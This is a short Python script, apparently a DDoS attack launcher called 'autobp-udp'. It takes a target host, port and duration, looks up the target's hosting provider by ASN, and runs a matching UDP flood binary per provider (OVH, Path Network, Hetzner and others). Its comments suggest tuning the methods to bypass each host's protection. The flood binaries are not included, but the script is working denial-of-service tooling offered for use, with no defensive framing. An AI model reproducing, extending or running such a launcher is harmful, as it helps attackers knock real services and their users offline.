# More code does not mean better
# XPLODE - ARX
# * UPLOAD THE METHODS YOU NEED IN THE SERVER - REPLACE THE ./MEHTHOD WITH YOUR METHOD NAMES LINES (27, 30, 33, 36 etc.)
# SAME AS AUTOBP-TCP BUT USED FOR UDP
import socket
import os
import subprocess
import json
import requests
import getpass
import sys
import time

print("Welcome to v1 udp - xplode, archs") # autobp UDP v1 most simple version
print(f"python autobp-udp.py [HOST] [PORT] [TIME]")

host = sys.argv[1]
port = sys.argv[2] 
time = sys.argv[3]


ip_api_response = requests.get(f"http://ip-api.com/json/{host}?fields=as")
json_ip_data = json.loads(ip_api_response.text)
targ = json_ip_data["as"]


if targ == "AS16276 OVH SAS":
    os.system(f"./udp-method1 {host} {port} {time}")

elif targ == "AS396998 Path Network, Inc.":
    os.system(f"./udp-method2 {host} {port} {time}")

elif targ == "AS53667 FranTech Solutions":
    os.system(f"./udp-method3 {host} {port} {time}")

elif targ == "AS36231 Tempest Hosting, LLC":
    os.system(f"./udp-method4 {host} {port} {time}")

elif targ == "AS32751 Nuclearfallout Enterprises, Inc.": # you can add more asns by just pasting them in with ur method
    os.system(f"./udp-method5 {host} {port} {time}")

elif targ == "AS24940 Hetzner Online GmbH":
    os.system(f"./udp-method6 {host} {port} {time}")    

else:
    
    os.system(f"./method7 {host} {port} {time}") # unkown asn command (use a normal udp method or sum)

    unkown = open(f"{host}.log", "w")

    unkown.write(f"UNKOWN\n")
    unkown.write(f"HOST: {host}\n")
    unkown.write(f"PORT USED: {port}\n")
    unkown.write(f"ASN: {targ}\n")
    unkown.write("\n")
    unkown.close()


